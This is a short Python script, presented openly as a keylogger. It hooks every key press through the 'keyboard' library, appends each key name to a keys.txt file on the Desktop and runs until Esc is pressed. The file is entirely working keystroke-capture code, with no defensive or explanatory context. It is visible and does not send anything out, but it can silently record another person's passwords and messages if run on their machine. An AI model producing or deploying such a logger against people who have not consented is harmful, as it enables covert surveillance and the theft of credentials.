import keyboard  # Import the keyboard library
import os

# Define the file path for saving keystrokes
desktop_path = os.path.expanduser("~/Desktop")  # Get the path to the desktop
log_file = os.path.join(desktop_path, "keys.txt")  # Define the full file path

def log_key(keyboard_event):
    with open(log_file, "a") as f:
        if keyboard_event.name:  # Check if the key has a name attribute
            f.write(f"{keyboard_event.name}\n")  # Write the key to the file

# Set up the keylogger
keyboard.on_press(log_key)  # Register the function to be called on each key press

# Run the keylogger until 'esc' is pressed
print("Keylogger is running. Press 'Esc' to stop.")
keyboard.wait('esc')  # Block program execution until 'esc' is pressed
print("Keylogger stopped.")
